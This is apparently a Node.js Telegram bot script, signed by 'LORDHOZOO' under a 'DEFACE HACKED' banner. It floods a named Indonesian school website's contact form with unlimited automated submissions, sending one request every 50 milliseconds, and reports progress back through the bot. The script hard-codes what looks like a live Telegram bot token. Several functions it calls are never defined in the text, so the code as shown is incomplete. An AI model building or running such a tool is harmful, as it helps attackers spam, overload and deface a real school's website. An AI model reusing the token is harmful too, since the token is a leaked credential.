const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const banner = `
██████╗ ███████╗███████╗ █████╗  ██████╗███████╗
██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝
██║  ██║█████╗  █████╗  ███████║██║     █████╗  
██║  ██║██╔══╝  ██╔══╝  ██╔══██║██║     ██╔══╝  
██████╔╝███████╗██║     ██║  ██║╚██████╗███████╗
╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝
        [DEFACE HACKED LORDHOZOO ]
        [Author : LORDHOZOO]
        [YOUTUBE : LORDHOZOO]
        [TIKTOK  : LORDHOZOO]
        [ DILIRIS : 2025-04-25 JUMAT ]`;
const token = '7252116522:AAHJlPUkFJJHjN3AufQ6jh6Zm1BIIN1RHLA';
const bot = new TelegramBot(token, {polling: true});
const userAgents = [
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
  "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
];
let targetUrls = [
  {
    formUrl: "https://asik.smamudabos.sch.id/index2.php",
    submitUrl: "https://asik.smamudabos.sch.id/index2.php?page=kirimpesan",
    adminUrl: "https://asik.smamudabos.sch.id/admin/hubungi.php"
  }
];
let activeAttacks = {};
let attackStats = {
  totalAttempts: 0,
  totalSuccess: 0,
  runningAttacks: 0
};
const mainMenu = {
  reply_markup: {
    keyboard: [
      [{ text: '🚀 Start Attack' }, { text: '💣 Unlimited Attack' }],
      [{ text: '⚙️ Settings' }, { text: '📊 Stats' }],
      [{ text: '🛑 Stop All Attacks' }, { text: 'ℹ️ Help' }]
    ],
    resize_keyboard: true,
    one_time_keyboard: false
  }
};
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, `HACKED BY R@@T LORDHOZOO \n${banner}`, mainMenu);
});

// Handle all messages
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (text === '🚀 Start Attack') {
    askAttackDetails(chatId);
  } else if (text === '💣 Unlimited Attack') {
    askUnlimitedAttackDetails(chatId);
  } else if (text === '⚙️ Settings') {
    showSettings(chatId);
  } else if (text === '📊 Stats') {
    showStats(chatId);
  } else if (text === '🛑 Stop All Attacks') {
    stopAllAttacks(chatId);
  } else if (text === 'ℹ️ Help') {
    showHelp(chatId);
  }
});

// Ask for unlimited attack details
function askUnlimitedAttackDetails(chatId) {
  bot.sendMessage(chatId, '💣 Enter message for UNLIMITED attack (999999999999 requests):', {
    reply_markup: {
      force_reply: true
    }
  }).then((sentMsg) => {
    bot.onReplyToMessage(chatId, sentMsg.message_id, (reply) => {
      const message = reply.text;
      if (!message) {
        bot.sendMessage(chatId, 'Invalid message. Please try again.');
        return;
      }
      startUnlimitedAttack(chatId, message);
    });
  });
}
function startUnlimitedAttack(chatId, message) {
  if (activeAttacks[chatId]) {
    bot.sendMessage(chatId, '⚠️ You already have an active attack. Stop it first.');
    return;
  }
  const attackId = Date.now();
  activeAttacks[chatId] = {
    id: attackId,
    running: true,
    count: 0,
    success: 0
  };
  attackStats.runningAttacks++;
  bot.sendMessage(chatId, `💣 Starting UNLIMITED ATTACK with message: ${message}\n\nThis will run until manually stopped.`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: '🛑 Stop This Attack', callback_data: `stop_${attackId}` }]
      ]
    }
  });
  attackLoop(chatId, attackId, message);
}
async function attackLoop(chatId, attackId, message) {
  while (activeAttacks[chatId] && activeAttacks[chatId].id === attackId && activeAttacks[chatId].running) {
    for (const target of targetUrls) {
      try {
        const result = await sendAttack(target.formUrl, target.submitUrl, target.adminUrl, message);
        activeAttacks[chatId].count++;
        attackStats.totalAttempts++;
        if (result.success) {
          activeAttacks[chatId].success++;
          attackStats.totalSuccess++;
        }
        if (activeAttacks[chatId].count % 100 === 0) {
          const stats = activeAttacks[chatId];
          bot.sendMessage(chatId, 
            `⚡ Attack Progress (${attackId})\n` +
            `Requests: ${stats.count}\n` +
            `Success: ${stats.success}\n` +
            `Success Rate: ${Math.round((stats.success / stats.count) * 100)}%`,
            {
              reply_markup: {
                inline_keyboard: [
                  [{ text: '🛑 Stop Attack', callback_data: `stop_${attackId}` }]
                ]
              }
            }
          );
        }
      } catch (error) {
        console.error('Attack error:', error);
      }
    }
    await new Promise(resolve => setTimeout(resolve, 50));
  }
}
bot.on('callback_query', (callbackQuery) => {
  const msg = callbackQuery.message;
  const chatId = msg.chat.id;
  const data = callbackQuery.data;
  if (data.startsWith('stop_')) {
    const attackId = parseInt(data.split('_')[1]);
    stopAttack(chatId, attackId);
    bot.answerCallbackQuery(callbackQuery.id, { text: 'Attack stopped!' });
  }
});
function stopAttack(chatId, attackId) {
  if (activeAttacks[chatId] && activeAttacks[chatId].id === attackId) {
    const stats = activeAttacks[chatId];
    delete activeAttacks[chatId];
    attackStats.runningAttacks--;
    bot.sendMessage(chatId, 
      `🛑 Attack ${attackId} stopped!\n` +
      `Total Requests: ${stats.count}\n` +
      `Success: ${stats.success}\n` +
      `Success Rate: ${stats.count > 0 ? Math.round((stats.success / stats.count) * 100) : 0}%`
    );
  }
}
function stopAllAttacks(chatId) {
  let stoppedCount = 0;
  for (const [key, attack] of Object.entries(activeAttacks)) {
    if (parseInt(key) === chatId) {
      delete activeAttacks[key];
      stoppedCount++;
      attackStats.runningAttacks--;
    }
  }
  if (stoppedCount > 0) {
    bot.sendMessage(chatId, `🛑 Stopped ${stoppedCount} active attacks.`);
  } else {
    bot.sendMessage(chatId, 'No active attacks to stop.');
  }
}
console.log('DEFACE Telegram Bot is running...');
